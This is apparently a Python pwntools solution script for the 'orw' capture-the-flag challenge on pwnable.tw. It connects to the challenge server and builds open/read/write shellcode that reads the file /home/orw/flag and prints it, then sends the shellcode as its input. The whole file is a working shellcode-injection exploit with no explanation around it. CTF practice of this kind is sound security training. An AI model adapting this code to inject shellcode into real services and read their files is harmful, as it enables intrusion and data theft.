from pwn import *

exe = "./orw-2"


gdbscript = '''
b *main+66
c
'''

elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
# p = gdb.debug([exe], gdbscript)
p = remote('chall.pwnable.tw', 10001)

payload = asm(shellcraft.open(b'/home/orw/flag').rstrip())
payload += asm(shellcraft.read("eax", "esp", 1000))
payload += asm(shellcraft.write(1, "esp", 1000))

p.sendafter(b":", payload)
p.interactive()

